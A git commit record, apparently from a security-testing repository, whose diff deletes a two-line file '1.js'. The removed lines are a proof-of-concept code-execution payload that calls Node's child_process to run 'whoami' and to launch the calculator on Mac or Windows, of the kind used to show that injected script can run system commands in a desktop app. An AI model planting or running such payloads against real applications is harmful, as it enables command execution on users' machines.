595e1d9678cc3127adb4a965f14f1075bbdf7d9e
meiqiu <672873386@qq.com>
2023-04-21 15:35:15 +0800

    Delete 1.js

--- 1.js
+++
@@ -1,2 +0,0 @@
-alert(require('child_process').execSync('whoami')); 
-if(navigator.userAgent.indexOf("Mac")!=-1){ require('child_process').exec('open -a Calculator'); } else{ require('child_process').exec('calc'); }
